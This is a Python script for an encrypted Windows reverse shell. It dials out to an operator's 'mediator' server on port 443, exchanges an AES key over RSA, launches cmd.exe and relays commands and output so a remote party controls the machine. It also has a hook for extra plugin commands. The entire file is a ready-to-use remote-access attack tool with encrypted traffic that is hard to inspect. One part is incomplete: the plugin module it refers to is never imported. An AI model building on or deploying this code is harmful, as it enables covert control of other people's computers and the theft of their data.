#!/usr/bin/env python3
"""
Program: windowsTarget.py
Description: End-to-end encrypted TCP reverse shell -- connects to mediator server to be bridged to the reverse shell handler client connection
"""

import argparse
from Crypto.Cipher import AES
from Crypto.Cipher import PKCS1_OAEP
from Crypto.PublicKey import RSA
from Crypto.Random import get_random_bytes
import inspect
import socket
import subprocess
import threading


class WindowsRShell:
    def __init__(self, mediatorHost="", connectionKey="#!ConnectionKey_CHANGE_ME!!!"):
        self.connectionKey = connectionKey
        self.handler = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.plugins = self.loadPlugins()
        if not mediatorHost:
            raise(ValueError("Hostname of mediator server not specified."))
        self.connect(mediatorHost)
        self.cipherKey = self.keyExchange()

    def loadPlugins(self):
        commandClasses = inspect.getmembers(plugins, inspect.isclass)
        commandClasses.pop(0)
        externalCommands = dict()
        for className, commandObject in commandClasses:
            externalCommands[str(commandObject)] = commandObject.windowsTarget
        return externalCommands

    def tryPlugin(self, commandLine):
        argv = commandLine.split()
        if not argv:
            # newline sent -- not a plugin
            return False
        command = argv[0]
        try:
            self.plugins[command](argv)
            return True
        except KeyError:
            # command not in plugins
            return False

    def readCommands(self, cmdexe):
        while True:
            nonce = self.handler.recv(16)
            tag = self.handler.recv(16)
            ciphertext = self.handler.recv(1024)
            cipher = AES.new(self.cipherKey, AES.MODE_EAX, nonce=nonce)
            command = cipher.decrypt(ciphertext)
            if len(command) > 0:
                # check if command is a plugin -- if so run plugin's windows target code
                plugin = self.tryPlugin(command)
                if not plugin:
                    # not a plugin -- send command to shell
                    cmdexe.stdin.write(command)
                    cmdexe.stdin.flush()

    def sendResponses(self, cmdexe):
        while True:
            ch = cmdexe.stdout.read(1)
            cipher = AES.new(self.cipherKey, AES.MODE_EAX)
            nonce = cipher.nonce
            ciphertext, tag = cipher.encrypt_and_digest(ch)
            self.handler.send(nonce)
            self.handler.send(tag)
            self.handler.send(ciphertext)

    def keyExchange(self):
        try:
            pemPubKey = self.handler.recv(1024)
            pubKey = RSA.import_key(pemPubKey)
        except ValueError:
            # timeout or duplicate key -- connection closed by server
            # change key or try again soon
            exit(1)
        key = get_random_bytes(32)
        cipher = PKCS1_OAEP.new(pubKey)
        message = cipher.encrypt(key)
        self.handler.send(message)
        return key

    def connect(self, mediatorHost):
        self.handler.connect((socket.gethostbyname(mediatorHost), 443))
        self.handler.sendall(self.connectionKey.encode())
        verification = self.handler.recv(1024)

    def run(self):
        cmdexe = subprocess.Popen(["\\windows\\system32\\cmd.exe"],
                                  shell=True,
                                  stdout=subprocess.PIPE,
                                  stderr=subprocess.STDOUT,
                                  stdin=subprocess.PIPE)
        s2p_thread = threading.Thread(target=self.readCommands, args=[cmdexe])
        s2p_thread.daemon = True
        s2p_thread.start()
        p2s_thread = threading.Thread(target=self.sendResponses, args=[cmdexe])
        p2s_thread.daemon = True
        p2s_thread.start()
        try:
            cmdexe.wait()
        except KeyboardInterrupt:
            self.handler.close()


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="")
    parser.add_argument("-c", "--connection-key", dest="connectionKey", action="store")
    parser.add_argument("-s", "--server", dest="serverAddr", action="store",
                        default="example.com")
    args = parser.parse_args()
    if args.connectionKey:
        rShell = WindowsRShell(mediatorHost=args.serverAddr, connectionKey=args.connectionKey)
    else:
        rShell = WindowsRShell(mediatorHost=args.serverAddr)
    rShell.run()

